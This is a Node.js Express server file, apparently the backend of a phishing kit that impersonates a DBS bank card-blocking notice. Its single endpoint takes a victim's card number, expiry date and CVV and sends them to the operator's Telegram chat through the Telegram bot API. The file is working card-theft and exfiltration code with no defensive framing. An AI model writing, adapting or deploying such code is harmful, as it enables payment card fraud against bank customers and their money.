const express = require('express');
const fetch = require('node-fetch');
const dotenv = require('dotenv');
dotenv.config();

const app = express();
app.use(express.json());
app.use(express.static(__dirname + '/public')); // jika ada HTML/CSS

app.post('/kirim-ke-telegram', async (req, res) => {
  const { nomor, valid, cvv } = req.body;
  const message = `🛑 *PEMBLOKIRAN KARTU DBS*\n\n*Nomor:* ${nomor}\n*Valid Thru:* ${valid}\n*CVV:* ${cvv}`;
  const chat_id = process.env.CHAT_ID;
  const token = process.env.BOT_TOKEN;

  try {
    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id, text: message, parse_mode: "Markdown" })
    });

    if (response.ok) {
      res.sendStatus(200);
    } else {
      throw new Error("Gagal mengirim ke Telegram");
    }
  } catch (error) {
    res.status(500).send("Gagal: " + error.message);
  }
});

app.listen(3000, () => {
  console.log('Server aktif di http://localhost:3000');
});
